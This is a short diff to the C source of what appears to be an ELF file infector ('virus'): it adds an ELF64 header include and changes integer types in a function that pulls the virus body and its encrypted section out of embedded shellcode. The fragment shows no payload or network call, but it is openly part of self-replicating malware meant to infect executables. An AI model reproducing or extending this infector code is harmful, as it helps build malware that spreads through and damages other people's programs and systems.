@@ -1,5 +1,6 @@
 #include "lib/lib.h"
 #include "lib/infect.h"
+#include "lib/elf64.h"
 #include "virus_shellcode.h"
 
 int usage(char *name){
@@ -20,16 +21,16 @@ int randomize(char *k){
 
 int get_virus_info(char **v, size_t *l, size_t *c_off, size_t *c_len){
 	if (elf_check_valid(virus_shellcode, virus_shellcode_len) == FALSE) return FALSE;
-	long long bin_start_off;
-	long long bin_end_off;
+	int64_t bin_start_off;
+	int64_t bin_end_off;
 
 	elf_off_symbol(virus_shellcode, virus_shellcode_len, "bin_start", &bin_start_off);
 	elf_off_symbol(virus_shellcode, virus_shellcode_len, "bin_end", &bin_end_off);
 	(*v) = virus_shellcode + bin_start_off;
 	(*l) = bin_end_off - bin_start_off; 
 
-	elf_off_symbol(virus_shellcode, virus_shellcode_len, "crypt_start", c_off);
-	elf_off_symbol(virus_shellcode, virus_shellcode_len, "crypt_end", c_len);
+	elf_off_symbol(virus_shellcode, virus_shellcode_len, "crypt_start", (int64_t*)c_off);
+	elf_off_symbol(virus_shellcode, virus_shellcode_len, "crypt_end", (int64_t*)c_len);
 	(*c_len) = (*c_len)-(*c_off);
 	(*c_off) -= bin_start_off; 
 
